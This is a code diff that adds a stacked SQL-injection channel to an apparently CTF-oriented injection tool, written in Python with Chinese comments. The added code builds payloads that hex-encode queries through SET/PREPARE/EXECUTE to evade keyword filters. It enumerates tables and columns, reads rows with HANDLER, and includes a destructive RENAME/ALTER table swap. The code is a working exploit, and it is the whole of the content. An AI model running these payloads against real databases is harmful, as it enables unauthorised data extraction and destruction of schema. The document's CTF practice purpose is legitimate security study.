@@ -182,6 +182,94 @@ class BoolOracle(BaseOracle):
 
 
 # ---------------------------------------------------------------------------
+# 堆叠通道（PREPARE + 十六进制，强网杯"随便注"类环境）
+# ---------------------------------------------------------------------------
+def parse_php_arrays(text: str) -> list:
+    """解析 var_dump/print_r 风格回显，返回每个 array(...) 的值列表。"""
+    rows = []
+    for m in re.finditer(r"array\(\d+\)\s*\{(.*?)\n\}", text, re.S):
+        vals = []
+        for sm in re.finditer(r'string\(\d+\)\s+"((?:[^"\\]|\\.)*)"|int\((-?\d+)\)|=>\s*\n?\s*NULL', m.group(1)):
+            if sm.group(1) is not None:
+                vals.append(sm.group(1))
+            elif sm.group(2) is not None:
+                vals.append(sm.group(2))
+            else:
+                vals.append("NULL")
+        if vals:
+            rows.append(vals)
+    return rows
+
+
+class StackedOracle(BaseOracle):
+    """堆叠注入取数通道：SET @a=0x{hex(sql)};PREPARE a FROM @a;EXECUTE a;
+
+    预处理语句把完整 select 编码为十六进制，绕过一切关键字/点号过滤；
+    结果经 var_dump 回显解析（~~标记包裹）。"""
+    name = "stacked"
+
+    def __init__(self, *a, **kw):
+        super().__init__(*a, **kw)
+        if self.waf.is_filtered(";"):
+            raise OracleError("分号被过滤，堆叠通道不可用")
+        if self.waf.is_filtered("prepare") or self.waf.is_filtered("execute"):
+            raise OracleError("prepare/execute 被过滤（可尝试 handler 读取）")
+
+    def run_stacked(self, statements: str, neutralize: bool = True) -> list:
+        """执行任意分号分隔的语句（statements 不含原查询前缀），返回回显数组。"""
+        base = "0" if neutralize else self.inj.base_value
+        pre = base if self.inj.numeric else base + self.inj.closure
+        from ..tampers import to_hex_literal
+        payload = f"{pre};{statements.strip('; ')};{self.inj.comment}"
+        r = self.s.request_value(payload)
+        self.requests += 1
+        if r.status_code < 0:
+            raise OracleError("请求失败")
+        return parse_php_arrays(r.body)
+
+    def scalar(self, expr: str) -> str:
+        from ..tampers import to_hex_literal
+        sql = f"select concat(0x7e7e,ifnull(({expr}),0x4e554c4c),0x7e7e)"
+        stmts = (f"SET @a={to_hex_literal(sql)};"
+                 f"PREPARE a FROM @a;EXECUTE a")
+        try:
+            payload = (f"{'0' if not self.inj.numeric else '0'}{self.inj.closure}"
+                       f";{stmts};{self.inj.comment}")
+            r = self.s.request_value(payload)
+            self.requests += 1
+            if r.status_code < 0:
+                raise OracleError("请求失败")
+            m = re.search(re.escape(MARK_L) + r"(.*?)" + re.escape(MARK_L), r.body, re.S)
+            if m:
+                val = m.group(1)
+                return "" if val == "NULL" else val
+        except OracleError:
+            raise
+        raise OracleError(f"PREPARE 回显标记未找到: {expr[:60]}")
+
+    def show_tables(self) -> list:
+        rows = self.run_stacked("SHOW TABLES")
+        return [v for row in rows for v in row if v]
+
+    def show_columns(self, table: str) -> list:
+        rows = self.run_stacked(f"SHOW COLUMNS FROM `{table}`")
+        # 每列一行 array，[0] 为列名
+        return [row[0] for row in rows if row]
+
+    def handler_first(self, table: str) -> list:
+        rows = self.run_stacked(f"HANDLER `{table}` OPEN;HANDLER `{table}` READ FIRST")
+        return rows[0] if rows else []
+
+    def rename_swap(self, flag_table: str, flag_col: str,
+                    orig_table: str = "words", orig_col: str = "id"):
+        """RENAME 换表法（破坏性 DDL，需用户确认）。"""
+        stmts = (f"RENAME TABLE `{orig_table}` TO `{orig_table}_bak`;"
+                 f"RENAME TABLE `{flag_table}` TO `{orig_table}`;"
+                 f"ALTER TABLE `{orig_table}` CHANGE `{flag_col}` `{orig_col}` VARCHAR(100)")
+        self.run_stacked(stmts, neutralize=False)
+
+
+# ---------------------------------------------------------------------------
 # 时间盲注通道
 # ---------------------------------------------------------------------------
 class TimeOracle(BaseOracle):
